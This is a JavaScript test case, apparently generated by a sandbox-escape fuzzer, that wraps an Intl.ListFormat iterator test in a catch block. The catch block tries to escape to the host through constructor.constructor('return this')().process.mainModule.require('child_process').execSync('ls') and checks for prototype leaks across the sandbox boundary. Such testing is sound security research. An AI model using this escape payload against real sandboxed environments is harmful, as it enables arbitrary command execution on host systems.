try {
    function CustomError() {
        let REPLACER = 23;
    }
    let lf = new Intl.ListFormat();
    let iterator_value_throw = {
        [Symbol.iterator]() {
            let REPLACER = 23;
            return this;
        },
        count: 0,
        next() {
            let REPLACER = 23;
            this.count++;
            if (this.count == 3) {
                return {
                    done: false,
                    get value() {
                        throw () => {
                            return () => {
                            };
                        };
                        throw new CustomError();
                    }
                };
            }
            if (this.count < 5) {
                return {
                    done: false,
                    value: String(this.count)
                };
            }
            return { done: true };
        }
    };
    assert.throws(CustomError, () => {
        lf.formatToParts(iterator_value_throw);
    });
    assert.sameValue(iterator_value_throw.count, 3);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}